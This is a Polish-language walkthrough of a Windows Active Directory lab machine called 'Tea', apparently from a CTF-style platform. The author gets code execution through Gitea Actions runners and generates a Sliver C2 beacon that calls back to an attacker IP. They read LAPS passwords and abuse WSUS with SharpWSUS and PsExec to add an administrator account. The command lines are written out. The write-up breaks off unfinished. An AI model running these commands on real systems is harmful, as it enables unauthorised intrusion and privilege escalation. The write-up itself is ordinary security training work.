# Tea
Windows, Medium, created by **kozie**

![tea_slide](https://github.com/user-attachments/assets/1d64456c-c18d-4db6-baed-de06eb17eed7)

```
Nmap scan report for 10.10.162.37
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-22 12:22:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tea.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tea.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
51834/tcp open  msrpc         Microsoft Windows RPC
62537/tcp open  msrpc         Microsoft Windows RPC
64037/tcp open  msrpc         Microsoft Windows RPC
64039/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
64040/tcp open  msrpc         Microsoft Windows RPC
64051/tcp open  msrpc         Microsoft Windows RPC


Nmap scan report for 10.10.162.38
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
3000/tcp  open  ppp?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=SRV.tea.vl
| Issuer: commonName=SRV.tea.vl
8530/tcp  open  http          Microsoft IIS httpd 10.0
8531/tcp  open  unknown
49670/tcp open  msrpc         Microsoft Windows RPC

```

nice z smb null i guest.
nic z ldapa.
na 3000 mamy gitea.

![{3FB20AF9-7422-4ED7-A495-A7EE71B75837}](https://github.com/user-attachments/assets/6e401bfa-8b32-447b-b04f-68d7cea4907f)

robimy usera.

![{0288ED8E-C6EA-4421-B4D8-4BBFB6D5B755}](https://github.com/user-attachments/assets/eec0a41f-3cdd-40c8-b1f3-aa6c343444ea)

wygląda na to, że to będzie rce przez gitea runners

zrobię krok po kroku.

Create a new repo

![{5621793F-60A6-491C-AD2E-689A5DCAAD4D}](https://github.com/user-attachments/assets/bec20240-5cf4-4067-a792-5ef65a3fc02e)

![{91C18823-F149-42AF-B21B-4F6E9F5DD289}](https://github.com/user-attachments/assets/4a0da2c0-e8ed-4895-904e-35ec552e6a74)

stworzyło się.

w settings klikamy `Enable Repository actions`

![{F32DCB5D-D9EE-49B6-95F8-D7C85BC29F7B}](https://github.com/user-attachments/assets/c739d176-017f-4fef-8920-8bcc822caec7)

teraz troche `docsów` [https://blog.gitea.com/feature-preview-gitea-actions/](https://blog.gitea.com/feature-preview-gitea-actions/)

![{C20DE314-D141-4A81-ACF5-0FC79EFD4464}](https://github.com/user-attachments/assets/072acc29-2b3d-4de2-88fe-815a87bf1cb6)

o i mamy nasz payload (ale pamiętamy, że to windows)

generuję sobie revshella w powershellu

![{A377889B-7A21-4443-8C15-8E00B8175368}](https://github.com/user-attachments/assets/2e3570b5-8e4b-4804-8a0f-78231837364d)

![{E813ACD1-40F6-4CEE-90B8-8D9462FD5EAF}](https://github.com/user-attachments/assets/52ae54a0-790c-4b9d-ab9f-d12ae93a5aaf)

mniej więcej coś takiego. Teraz commit changes

![{47B8C10F-CE93-4202-9B8D-19F536B1DFC9}](https://github.com/user-attachments/assets/eff71693-f33f-4a96-acd1-72d11285d718)

i mmay shella po ~10sek

![{3883BA25-4D3C-4BEA-8CFD-C3E65510C34D}](https://github.com/user-attachments/assets/6e2ccf27-2e9d-41c5-8cbb-360fd85d0f75)

już myślałem, że fajny shell będzie, ale.. port 22 nie jest otwarty :/

![{09F838FD-C64B-44D6-8B65-07A38A900AEA}](https://github.com/user-attachments/assets/fb31869c-62c6-411a-916b-84c7de7c7c10)

ale chociaż flagę dali

![{091F78EF-5662-467D-9831-0509621C3DAA}](https://github.com/user-attachments/assets/6fa51966-36ad-4e1b-8cc2-42b6ae6fa748)

te grupki ciekawe całkiem.

![{3B3A3B61-C126-4686-9596-358494B15A85}](https://github.com/user-attachments/assets/31b5559e-bdb3-4f62-9e5f-894aca334c70)

psexec też ciekawe, że widzimy tutaj (ale laps ciekawsze)

![{39A58CE0-01D4-4C4D-8D58-6C40CA2B1FC7}](https://github.com/user-attachments/assets/2e955980-5b28-4f79-9f03-05da1943dc74)

z ciekawosci wziąłem hash i sprawdzam czy hasło nie wystęuje w rockyou
- nie występuje

Ostatnio trochę mocniej w redteam idę i bawię się sliverem więc tutaj użyjemy slivera zamiast ładować binarki na maszynkę.
```
generate beacon --seconds 5 --jitter 3 --os windows --arch amd64 --format EXECUTABLE --http 10.8.4.124:443 --name tea --save ./beacon.exe -G 
```
(to leci kilka minut. Jak chcesz szybciej to daj sobie --skip-symbols)

![{1FEA1625-9874-4853-87F3-60A89544B0D9}](https://github.com/user-attachments/assets/3ba8bf74-1525-429e-8b81-1037052d6e5b)

![{A1EAA0A4-A09D-4AAA-84C8-5B66F214A021}](https://github.com/user-attachments/assets/1e53e662-f6a1-4a14-b3df-95ac0d67dda6)

i mamy to

![{AEDBCEB7-A851-45D5-A9DA-01C875DA0839}](https://github.com/user-attachments/assets/3f782e27-9a0e-4076-9b32-bca914b1ec7d)

`sharp-hound-4 -i -s -t 120 -- -c all`

![{D5E53598-B2B1-43BB-B647-FC35C9916F4B}](https://github.com/user-attachments/assets/5a8a9f8e-b827-4ff5-b2fc-4614f647fdcb)

![{65326E1F-3156-41F5-9D57-1115049B6BA8}](https://github.com/user-attachments/assets/b52a7459-5007-49bf-8163-6a7b95650488)

chyba mam za nowego bloodhound :/
- Ale to oleję. Wiemy, że mamy coś z lapsem więc spróbuję zobaczyć czy mamy uprawnienia do czytania hasła z LAPS po prostu z powershella (bloodhound nie robi jakiejś magi. To tylko zbiór komend xd)

![{938D800B-51E0-45DD-AFE0-7B9A99B64E3F}](https://github.com/user-attachments/assets/5f2771c8-f223-48b8-a121-892b666ccf4b)

Możemy.

![asplaintext](https://github.com/user-attachments/assets/c73cb875-b51a-47bc-8e12-359a10129e0d)

- próbuję uruchomić drugą sesję slivera jako administrator, ale... składnia mi się działa.
- Poszedłem na RDP :D

![{84EFACF5-2B7E-4442-B20E-247C471D14F2}](https://github.com/user-attachments/assets/1f6c156a-bd55-49c1-8a66-a8ea7a30f563)


![{F3ABBF20-62F8-49A2-BFEE-BD850CA5CA3C}](https://github.com/user-attachments/assets/de7b383d-335f-41e0-b17e-61f310c7b756)

no to została nam jedna flaga
- szukając eskalacji możemy wrócic to tego co widzieliśmy.

![{044CA1EE-36B1-49E7-AC3B-76DAB67A96DB}](https://github.com/user-attachments/assets/c2ceb26f-b751-4409-bd7e-e41f037f6011)

![{CB905CF4-A02E-429A-87F8-220C90BA32A8}](https://github.com/user-attachments/assets/fe883697-a3e7-45f4-9ac8-e11813a9313d)

![{74B36F89-7BDA-47B8-8CFA-234150C6B61B}](https://github.com/user-attachments/assets/8d1c5797-7a0d-478f-8558-e1eb11b36102)


wygląda jakby pasowało :D

o to też wygląda jakby pasowało `https://github.com/techspence/SharpWSUS.git`

![{F9F6FFEF-5D9D-4BB8-81FE-7E55CB146C0F}](https://github.com/user-attachments/assets/62797a22-a4b4-483a-a53c-5b4466d738a1)

pobrałem sobie

![{E7DCFFB1-2E15-45C3-B112-506A6EDD295F}](https://github.com/user-attachments/assets/c3261892-4724-4fc5-8fcb-6e305e4fa03c)

```
sharpwsus.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \\"net user Hollow Password1! add && net localgroup administrators Hollow /add\\""
```

![{89AD566F-ACFE-4BDF-AA01-D1CB182F9052}](https://github.com/user-attachments/assets/bd6f2c71-39cf-4740-a1bc-94dc3eca1b00)


![{18E78348-719E-4566-ACC6-B94B17D963E7}](https://github.com/user-attachments/assets/75305924-6f30-4eb5-b658-dd81a52bf56b)

![{5C7AF4FE-AAB0-4D85-A78F-A2613A4BAF09}](https://github.com/user-attachments/assets/416febc8-7024-40b4-ad5f-ec3cbd8e2550)

jakoś po minucie mamy tutaj update

![{58FC3C4E-74C6-4AF5-8BE1-6D478D1D8952}](https://github.com/user-attachments/assets/224c3ea8-9126-4bb8-8b25-17c4effca655)

po kolejnych 3 minutach nie widzimy naszego usera :(

- poczekałem do 10 i znalazłem literówkę w payloadzie.

```
sharpwsus.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \\"net user Hollow Password1! /add && net localgroup administrators Hollow /add\\""
```

![{C5DD6CC9-8BB9-43C6-A04C-5609DD04F5A6}](https://github.com/user-attachments/assets/2dcd0d43-e509-4b13-9ade-1501b61ba896)

teraz mamy 1/4, a nie 1/3. Zawsze jakaś zmiana xD


# tutuaj wróć po świętach
zmieniłem strategię o odpalam komendy pojedynczo.
```

```
